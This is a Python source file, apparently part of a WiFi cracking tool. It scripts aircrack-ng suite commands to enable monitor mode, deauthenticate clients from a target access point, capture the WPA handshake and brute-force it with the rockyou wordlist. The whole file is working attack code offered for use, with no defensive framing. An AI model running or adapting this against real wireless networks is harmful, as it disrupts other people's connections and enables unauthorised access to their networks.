import subprocess, os, re

command = {
    "checkmonitorMode" : "sudo iw list | grep -o 'monitor' | sort -u",
    "getInterface" : "ip link show | grep -oP '(?<=: )[a-zA-Z0-9_-]+' | grep -E '^wl'",
    "getWIFI" : "nmcli device wifi list",
    "linkUp" : "sudo ip link set {interface} up",
    "airmonKill" : "sudo airmon-ng check kill",
    "startAirmon" : "sudo airmon-ng start {interface}",
    "stopAirmon" : "sudo airmon-ng stop {interface}mon",
    "restartNetworkManager" : "sudo systemctl restart NetworkManager",
    "deAuth" : "sudo aireplay-ng --deauth 5 -a {bssid} {interface}mon",
    "handShake" : "sudo airodump-ng --bssid {bssid} -c {channel} --write {cap_file} --output-format cap {interface}mon",
    "bruteForce" : "sudo aircrack-ng -w ./wordlists/rockyou.txt {cap_file}"
}

def monitorMode():
    cmd = subprocess.run(command["checkmonitorMode"], shell = True, capture_output = True, text = True)
    available = 'monitor' in cmd.stdout
    return available

def wifiInterface():
    cmd = subprocess.run(command["getInterface"], shell = True, capture_output = True, text = True)
    interface = cmd.stdout.strip()
    return interface

def availableNetworks():
    cmd = subprocess.run(command["getWIFI"], shell = True, capture_output = True, text = True)
    print(cmd.stdout.strip())

def saveCred():
    cred = input("Enter BSSID & Channel : ").split()
    bssid = cred[0]
    channel = cred[1]
    return bssid, channel

def activateMonitorMode(interface):
    try:
        subprocess.run(command["linkUp"].format(interface=interface), shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(command["airmonKill"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(command["startAirmon"].format(interface=interface), shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False
    
def deactivateMonitorMode(interface):
    try:
        subprocess.run(command["stopAirmon"].format(interface=interface), shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(command["linkUp"].format(interface=interface), shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(command["restartNetworkManager"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def deauthInjection(interface, bssid):
    subprocess.run(command["deAuth"].format(bssid=bssid, interface=interface), shell=True)

def captureHandshake(interface, bssid, channel):
    cap_file = "captureHS-01.cap"
    if os.path.exists(cap_file):
        os.remove(cap_file)
    subprocess.run(command["handShake"].format(bssid=bssid, channel=channel, cap_file=cap_file, interface=interface), shell=True)
    if os.path.exists(cap_file):
        os.replace(cap_file, cap_file)
     